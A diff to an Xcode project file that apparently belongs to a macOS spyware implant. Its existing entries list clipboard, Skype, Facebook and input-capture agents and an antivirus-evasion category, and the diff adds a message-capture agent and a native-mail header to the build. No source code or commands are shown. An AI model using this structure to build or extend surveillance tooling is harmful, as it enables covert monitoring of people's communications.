@@ -183,6 +183,7 @@
 		CC31C81016DCB5FB00922BD6 /* RCSMTask.m in Sources */ = {isa = PBXBuildFile; fileRef = CC31C80F16DCB5FB00922BD6 /* RCSMTask.m */; };
 		CC3718B016DE0EFA00658703 /* libsqlite3.dylib in Frameworks */ = {isa = PBXBuildFile; fileRef = CC3718AF16DE0EFA00658703 /* libsqlite3.dylib */; };
 		CCB619EC185F3B3B003B7D3E /* NSProcessInfo+NSProcessInfo__AVEvasion_.m in Sources */ = {isa = PBXBuildFile; fileRef = CCE74A7F185B1BB40029A342 /* NSProcessInfo+NSProcessInfo__AVEvasion_.m */; };
+		CCD43B5C18EC00AC005B2B67 /* RCSMAgentMessages.m in Sources */ = {isa = PBXBuildFile; fileRef = CCD43B5B18EC00AC005B2B67 /* RCSMAgentMessages.m */; };
 		CCE74A80185B1BB40029A342 /* NSProcessInfo+NSProcessInfo__AVEvasion_.m in Sources */ = {isa = PBXBuildFile; fileRef = CCE74A7F185B1BB40029A342 /* NSProcessInfo+NSProcessInfo__AVEvasion_.m */; };
 		CCFFD70615D8ED6E00131597 /* RCSMGlobals.m in Sources */ = {isa = PBXBuildFile; fileRef = CCFFD70515D8ED6E00131597 /* RCSMGlobals.m */; };
 /* End PBXBuildFile section */
@@ -432,6 +433,9 @@
 		CC3718AF16DE0EFA00658703 /* libsqlite3.dylib */ = {isa = PBXFileReference; lastKnownFileType = "compiled.mach-o.dylib"; name = libsqlite3.dylib; path = Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.6.sdk/usr/lib/libsqlite3.dylib; sourceTree = DEVELOPER_DIR; };
 		CC7ED16515C95CB100F90517 /* RCSMAVGarbage.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAVGarbage.h; path = Support/RCSMAVGarbage.h; sourceTree = "<group>"; };
 		CCCBE263183CFEEB00F626A3 /* RCSMInputmanager_aes.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMInputmanager_aes.h; path = Modules/RCSMInputmanager_aes.h; sourceTree = "<group>"; };
+		CCD43B5A18EC00AC005B2B67 /* RCSMAgentMessages.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAgentMessages.h; path = Agents/RCSMAgentMessages.h; sourceTree = "<group>"; };
+		CCD43B5B18EC00AC005B2B67 /* RCSMAgentMessages.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentMessages.m; path = Agents/RCSMAgentMessages.m; sourceTree = "<group>"; };
+		CCD43B5D18EC00C6005B2B67 /* RCSNativeMail.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSNativeMail.h; path = Support/RCSNativeMail.h; sourceTree = "<group>"; };
 		CCE74A7E185B1BB40029A342 /* NSProcessInfo+NSProcessInfo__AVEvasion_.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = "NSProcessInfo+NSProcessInfo__AVEvasion_.h"; path = "Categories/NSProcessInfo+NSProcessInfo__AVEvasion_.h"; sourceTree = "<group>"; };
 		CCE74A7F185B1BB40029A342 /* NSProcessInfo+NSProcessInfo__AVEvasion_.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = "NSProcessInfo+NSProcessInfo__AVEvasion_.m"; path = "Categories/NSProcessInfo+NSProcessInfo__AVEvasion_.m"; sourceTree = "<group>"; };
 		CCE75B5C15E7836F00879615 /* RCSMInterface.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = RCSMInterface.h; sourceTree = "<group>"; };
@@ -615,6 +619,7 @@
 			isa = PBXGroup;
 			children = (
 				1A87878A109F3DA100245A80 /* Speex */,
+				CCD43B5D18EC00C6005B2B67 /* RCSNativeMail.h */,
 				1A12A1501095F24C0090C4D7 /* mach_override.h */,
 				1A12A14F1095F24C0090C4D7 /* mach_override.mm */,
 				1ABE7E790F7CE6ED00BC61B1 /* RCSMUtils.h */,
@@ -840,6 +845,8 @@
 			isa = PBXGroup;
 			children = (
 				C52FEF3E16FC58F600DCBF2A /* Social */,
+				CCD43B5A18EC00AC005B2B67 /* RCSMAgentMessages.h */,
+				CCD43B5B18EC00AC005B2B67 /* RCSMAgentMessages.m */,
 				5262A92B132A5A2C001D1988 /* RCSMAgentClipboard.h */,
 				5262A92C132A5A2C001D1988 /* RCSMAgentClipboard.m */,
 				5262A92D132A5A2C001D1988 /* RCSMAgentIMSkype.h */,
@@ -1363,6 +1370,7 @@
 				C52FEF4116FC596200DCBF2A /* __m_Social_Module.m in Sources */,
 				C52FEF4516FC59C900DCBF2A /* __m_Social.m in Sources */,
 				C52FEF4816FC5A0E00DCBF2A /* __m_Social_Facebook.m in Sources */,
+				CCD43B5C18EC00AC005B2B67 /* RCSMAgentMessages.m in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
